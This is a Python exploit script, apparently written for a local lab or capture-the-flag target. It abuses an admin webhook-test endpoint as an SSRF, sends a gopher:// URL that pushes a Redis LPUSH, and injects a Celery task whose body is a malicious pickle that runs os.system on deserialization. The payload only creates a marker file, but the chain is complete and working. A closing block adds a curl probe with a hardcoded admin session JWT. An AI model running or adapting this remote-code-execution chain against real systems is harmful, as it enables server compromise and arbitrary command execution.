#!/usr/bin/env python3

import base64
import json
import os
import pickle
import sys
import urllib.parse

import requests


WEBHOOK_URL = "http://localhost:8080/api/admin/webhook-test"

# 從環境變數拿 admin JWT
JWT = os.environ["SESSION_TOKEN"]

# 只做無害 RCE proof
COMMAND = "touch /tmp/celery_success"


# Pickle 在反序列化時執行 os.system()
class RCE:
    def __reduce__(self):
        return (__import__("os").system, (COMMAND,))


# 這裡使用你原本抓到的正常 Celery message envelope
TASK = {
    "content-type": "application/x-python-serialize",
    "properties": {
        "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
        "reply_to": "9edb8565-0b59-3389-944e-a0139180a048",
        "delivery_mode": 2,
        "body_encoding": "base64",
        "delivery_info": {
            "routing_key": "celery",
            "priority": 0,
            "exchange": "celery",
        },
        "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999",
    },
    "headers": {},
    "content-encoding": "binary",
}


def make_pickle_body():
    payload = pickle.dumps(RCE(), protocol=2)

    print("[+] Pickle payload:")
    print(f"    {len(payload)} bytes")

    return base64.b64encode(payload).decode()


def make_redis_lpush(task_json):
    """
    Redis RESP:

    LPUSH celery <task_json>
    """

    command = (
        b"*3\r\n"
        b"$5\r\nLPUSH\r\n"
        b"$6\r\ncelery\r\n"
    )

    data = task_json.encode()

    command += (
        f"${len(data)}\r\n".encode()
        + data
        + b"\r\n"
    )

    return command


def make_gopher_url(resp):
    """
    gopher://redis:6379/_
    後面接 Redis RESP raw bytes。
    """

    encoded = urllib.parse.quote_from_bytes(
        resp,
        safe=""
    )

    return "gopher://redis:6379/_" + encoded


def main():
    print("[+] Target:")
    print(f"    {WEBHOOK_URL}")

    print("[+] RCE command:")
    print(f"    {COMMAND}")

    # 1. 建立 malicious pickle
    TASK["body"] = make_pickle_body()

    # 2. JSON serialize Celery envelope
    task_json = json.dumps(
        TASK,
        separators=(",", ":")
    )

    print("[+] Celery message:")
    print(f"    {len(task_json)} bytes")

    # 3. Redis LPUSH command
    resp = make_redis_lpush(task_json)

    print("[+] Redis RESP:")
    print(resp[:100])
    print(f"    {len(resp)} bytes")

    # 4. Encode 成 gopher URL
    gopher_url = make_gopher_url(resp)

    print("[+] Gopher URL:")
    print(gopher_url)

    # 5. 經由 webhook-test → SSRF → Redis
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session_token={JWT}",
    }

    print("\n[+] Sending payload...")

    response = requests.post(
        WEBHOOK_URL,
        headers=headers,
        json={
            "url": gopher_url
        },
        timeout=10,
    )

    print(f"[+] HTTP status: {response.status_code}")
    print("[+] Response:")
    print(response.text)

    print("\n[+] Payload sent.")
    print("[+] Now check celery-worker for /tmp/celery_success")
    print("[+] Check by the following command:")
    print('docker compose exec celery-worker sh -c "ls -l /tmp/celery_success"')


if __name__ == "__main__":
    main()


"""
# 打 gopher:// 到 redis:6379,送 PING 指令
# RESP 格式的 PING 是 *1\r\n$4\r\nPING\r\n
curl -X POST http://localhost:8080/api/admin/webhook-test \
  -H "Content-Type: application/json" \
  -H "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6InIzeCIsInN1YiI6MSwiaWF0IjoxNzg2MzYwNTU3LCJleHAiOjE3ODYzNjc3NTd9.Y1EAsLLvkeKmaK0wSKIVXto1Jl3s6ZQAo6ZBDlxd28U" \
  -d '{"url": "gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A"}'
# 回應裡看到 +PONG 代表 Redis 在線
"""
